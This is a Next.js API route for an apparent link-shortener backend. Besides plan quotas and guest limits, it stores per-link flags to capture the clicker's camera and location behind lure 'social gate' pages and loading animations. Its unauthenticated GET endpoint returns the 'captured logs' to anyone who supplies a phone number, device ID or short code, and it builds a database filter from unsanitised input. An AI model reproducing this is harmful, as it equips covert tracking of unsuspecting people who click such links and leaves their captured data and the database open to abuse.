import { NextResponse } from 'next/server';
import { supabase, supabaseAdmin } from '../../../lib/supabase';
import { getUserFromRequest } from '../../../lib/userAuth';
import { getPlanLimits } from '../../../lib/planLimits';

export async function OPTIONS() {
  const response = NextResponse.json({}, { status: 200 });
  response.headers.set('Access-Control-Allow-Origin', '*');
  response.headers.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  response.headers.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  return response;
}

function getOriginAndDomain(req: Request) {
  const host = req.headers.get('x-forwarded-host') || req.headers.get('host') || 'localhost:3005';
  let proto = req.headers.get('x-forwarded-proto');
  if (!proto) {
    proto = host.startsWith('localhost') || host.startsWith('127.0.0.1') ? 'http' : 'https';
  }
  return {
    origin: `${proto}://${host}`,
    domain: host.split(':')[0],
  };
}

export async function POST(req: Request) {
  try {
    const { origin, domain } = getOriginAndDomain(req);
    const body = await req.json();
    const {
      longUrl,
      customAlias,
      phoneNumber,
      captureCamera,
      captureLocation,
      socialGateTitle,
      socialGateUrl,
      socialGateDesc,
      socialGateBtnText,
      socialGateIcon,
      animationType,
      animationText,
      password,
      expirationDate,
      deviceId,
    } = body;

    // 1. Identify User Session
    const activeUser = await getUserFromRequest(req);
    let guestUsageCount = 0;

    // 2. Authenticated User Quota & Ban Enforcement
    if (activeUser) {
      try {
        const { data: dbUser } = await supabaseAdmin
          .from('app_users')
          .select('id, plan, plan_expires_at, daily_request_limit, daily_requests_used, daily_reset_date, total_requests_used, is_banned')
          .eq('id', activeUser.id)
          .maybeSingle();

        if (dbUser) {
          // Check if user is suspended/banned by Admin
          if (dbUser.is_banned) {
            return NextResponse.json(
              {
                error: 'ACCOUNT_BANNED',
                message: 'Your account has been suspended by the administrator.',
              },
              {
                status: 403,
                headers: { 'Access-Control-Allow-Origin': '*' },
              }
            );
          }

          const planLimits = await getPlanLimits();
          const now = new Date();
          const todayStr = now.toISOString().split('T')[0];
          let plan = dbUser.plan || 'free';
          let tierLimit = plan === 'premium' ? planLimits.premium : plan === 'pro' ? planLimits.pro : planLimits.free;
          let dailyLimit = typeof dbUser.daily_request_limit === 'number' && dbUser.daily_request_limit > 0 
            ? dbUser.daily_request_limit 
            : tierLimit;
          let dailyUsed = typeof dbUser.daily_requests_used === 'number' ? dbUser.daily_requests_used : 0;

          // Align with current live tier minimums
          if (plan === 'free') {
            dailyLimit = planLimits.free;
          } else if (plan === 'pro') {
            dailyLimit = Math.max(dailyLimit, planLimits.pro);
          } else if (plan === 'premium') {
            dailyLimit = Math.max(dailyLimit, planLimits.premium);
          }

          // Check if paid plan expired
          if (plan !== 'free' && dbUser.plan_expires_at) {
            if (new Date(dbUser.plan_expires_at) < now) {
              plan = 'free';
              dailyLimit = planLimits.free;
              await supabaseAdmin
                .from('app_users')
                .update({ plan: 'free', daily_request_limit: planLimits.free })
                .eq('id', dbUser.id);
            }
          }

          // Reset daily count if calendar date changed
          if (dbUser.daily_reset_date !== todayStr) {
            dailyUsed = 0;
            await supabaseAdmin
              .from('app_users')
              .update({ daily_requests_used: 0, daily_reset_date: todayStr })
              .eq('id', dbUser.id);
          }

          // Enforce daily quota
          if (dailyUsed >= dailyLimit) {
            return NextResponse.json(
              {
                error: 'DAILY_QUOTA_EXCEEDED',
                message: `You have reached your daily limit of ${dailyLimit} links for your ${plan.toUpperCase()} Plan today. Please upgrade your plan or redeem a coupon code to continue!`,
                dailyUsed,
                dailyLimit,
                plan,
              },
              {
                status: 403,
                headers: { 'Access-Control-Allow-Origin': '*' },
              }
            );
          }

          // Increment daily and total requests
          await supabaseAdmin
            .from('app_users')
            .update({
              daily_requests_used: dailyUsed + 1,
              total_requests_used: (dbUser.total_requests_used || 0) + 1,
              daily_reset_date: todayStr,
            })
            .eq('id', dbUser.id);
        }
      } catch (err) {
        console.error('Error verifying user plan quota:', err);
      }
    } else {
      // 3. Guest Usage Quota Enforcement (Strict 2 Free Tries per device/cookie)
      const planLimits = await getPlanLimits();
      const guestQuota = typeof planLimits.guest === 'number' ? planLimits.guest : 2;

      // Check cookie for persistent guest count across reloads
      const cookieHeader = req.headers.get('cookie') || '';
      const cookieMatch = cookieHeader.match(/supashort_guest_tries=(\d+)/);
      const cookieTries = cookieMatch ? parseInt(cookieMatch[1], 10) : 0;

      if (cookieTries >= guestQuota) {
        return NextResponse.json(
          {
            code: 'QUOTA_EXCEEDED',
            error: 'QUOTA_EXCEEDED',
            message: `You have used your ${guestQuota} free guest links. Please create a free account or sign in to continue generating links with full API hub access!`,
            guestCount: cookieTries,
            remainingFreeTries: 0,
          },
          {
            status: 403,
            headers: { 'Access-Control-Allow-Origin': '*' },
          }
        );
      }

      if (deviceId) {
        const { count, error: countErr } = await supabaseAdmin
          .from('urls')
          .select('id', { count: 'exact', head: true })
          .eq('device_id', deviceId);

        if (!countErr && typeof count === 'number') {
          guestUsageCount = Math.max(count, cookieTries);
          if (guestUsageCount >= guestQuota) {
            return NextResponse.json(
              {
                code: 'QUOTA_EXCEEDED',
                error: 'QUOTA_EXCEEDED',
                message: `You have used your ${guestQuota} free guest links. Please create a free account or sign in to continue generating links with full API hub access!`,
                guestCount: guestUsageCount,
                remainingFreeTries: 0,
              },
              {
                status: 403,
                headers: { 'Access-Control-Allow-Origin': '*' },
              }
            );
          }
        }
      } else if (cookieTries > 0) {
        guestUsageCount = cookieTries;
      }
    }

    if (!longUrl) {
      return NextResponse.json(
        { error: 'longUrl is required' },
        {
          status: 400,
          headers: { 'Access-Control-Allow-Origin': '*' },
        }
      );
    }

    if (!deviceId && !phoneNumber && !activeUser) {
      return NextResponse.json(
        { error: 'Phone number or authentication is required when Device ID is not available.' },
        {
          status: 400,
          headers: { 'Access-Control-Allow-Origin': '*' },
        }
      );
    }

    // Determine short code
    let shortCode = customAlias;
    if (!shortCode) {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      shortCode = '';
      for (let i = 0; i < 7; i++) {
        shortCode += chars.charAt(Math.floor(Math.random() * chars.length));
      }
    }

    // Insert into Supabase
    const { data, error } = await supabase
      .from('urls')
      .insert([
        {
          domain,
          short_code: shortCode,
          long_url: longUrl,
          password: password || null,
          social_gate_title: socialGateTitle || null,
          social_gate_url: socialGateUrl || null,
          social_gate_description: socialGateDesc || null,
          social_gate_button_text: socialGateBtnText || null,
          social_gate_icon: socialGateIcon || null,
          animation_type: animationType || 'ring',
          animation_text: animationText || 'LOADING',
          capture_camera: !!captureCamera,
          capture_location: !!captureLocation,
          expires_at: expirationDate ? new Date(expirationDate).toISOString() : null,
          device_id: deviceId || (activeUser ? `user-${activeUser.id}` : 'api-generated'),
          phone_number: phoneNumber || null,
          user_id: activeUser ? activeUser.id : null,
        },
      ])
      .select()
      .single();

    if (error) {
      if (error.code === '23505') {
        return NextResponse.json(
          { error: 'Custom alias is already in use for this domain.' },
          {
            status: 409,
            headers: { 'Access-Control-Allow-Origin': '*' },
          }
        );
      }
      console.error('Supabase Error:', error);
      return NextResponse.json(
        { error: error.message },
        {
          status: 500,
          headers: { 'Access-Control-Allow-Origin': '*' },
        }
      );
    }

    const generatedUrl = `${origin}/${shortCode}`;
    const newGuestCount = activeUser ? null : guestUsageCount + 1;
    const remaining = activeUser ? null : Math.max(0, 2 - (newGuestCount || 0));

    const response = NextResponse.json(
      {
        success: true,
        shortUrl: generatedUrl,
        data: data,
        isUnlimited: !!activeUser,
        guestCount: newGuestCount,
        remainingFreeTries: remaining,
      },
      {
        status: 201,
        headers: { 'Access-Control-Allow-Origin': '*' },
      }
    );

    if (!activeUser && newGuestCount !== null) {
      response.cookies.set('supashort_guest_tries', String(newGuestCount), {
        path: '/',
        maxAge: 60 * 60 * 24 * 365, // 1 year
        sameSite: 'lax',
      });
    }

    return response;
  } catch (err) {
    console.error('Internal API Error:', err);
    return NextResponse.json(
      { error: 'Internal Server Error' },
      {
        status: 500,
        headers: { 'Access-Control-Allow-Origin': '*' },
      }
    );
  }
}

export async function GET(req: Request) {
  try {
    const { origin } = getOriginAndDomain(req);
    const { searchParams } = new URL(req.url);
    const phoneNumber = searchParams.get('phoneNumber');
    const deviceId = searchParams.get('deviceId');
    const shortCode = searchParams.get('shortCode');

    if (!phoneNumber && !deviceId && !shortCode) {
      return NextResponse.json(
        {
          error: 'Provide phoneNumber, deviceId, or shortCode to fetch latest captured logs.',
        },
        {
          status: 400,
          headers: { 'Access-Control-Allow-Origin': '*' },
        }
      );
    }

    // Step 1: Find matching URLs
    let urlQuery = supabase.from('urls').select('id, short_code, long_url');

    if (shortCode) {
      urlQuery = urlQuery.eq('short_code', shortCode);
    } else if (phoneNumber && deviceId) {
      urlQuery = urlQuery.or(`device_id.eq.${deviceId},phone_number.eq.${phoneNumber}`);
    } else if (phoneNumber) {
      urlQuery = urlQuery.eq('phone_number', phoneNumber);
    } else if (deviceId) {
      urlQuery = urlQuery.eq('device_id', deviceId);
    }

    const { data: urls, error: urlsError } = await urlQuery;

    if (urlsError) {
      return NextResponse.json(
        { error: urlsError.message },
        {
          status: 500,
          headers: { 'Access-Control-Allow-Origin': '*' },
        }
      );
    }

    if (!urls || urls.length === 0) {
      return NextResponse.json(
        {
          success: true,
          message: 'No links found for this identity.',
          latestClick: null,
          logs: [],
        },
        {
          headers: { 'Access-Control-Allow-Origin': '*' },
        }
      );
    }

    const urlIds = urls.map((u) => u.id);
    const urlIdToShortCode = urls.reduce((acc, curr) => {
      acc[curr.id] = curr.short_code;
      return acc;
    }, {} as Record<string, string>);

    // Step 2: Fetch captured link analytics
    const { data: analytics, error: analyticsError } = await supabase
      .from('link_analytics')
      .select('*')
      .in('url_id', urlIds)
      .order('created_at', { ascending: false });

    if (analyticsError) {
      return NextResponse.json(
        { error: analyticsError.message },
        {
          status: 500,
          headers: { 'Access-Control-Allow-Origin': '*' },
        }
      );
    }

    // Map short_code back to each log
    const detailedLogs = (analytics || []).map((log) => ({
      ...log,
      short_code: urlIdToShortCode[log.url_id] || null,
      shortUrl: urlIdToShortCode[log.url_id] ? `${origin}/${urlIdToShortCode[log.url_id]}` : null,
    }));

    const latestClick = detailedLogs.length > 0 ? detailedLogs[0] : null;

    return NextResponse.json(
      {
        success: true,
        latestClick,
        totalClicks: detailedLogs.length,
        logs: detailedLogs,
      },
      {
        headers: { 'Access-Control-Allow-Origin': '*' },
      }
    );
  } catch (err: any) {
    console.error('API Error:', err);
    return NextResponse.json(
      { error: 'Internal Server Error' },
      {
        status: 500,
        headers: { 'Access-Control-Allow-Origin': '*' },
      }
    );
  }
}
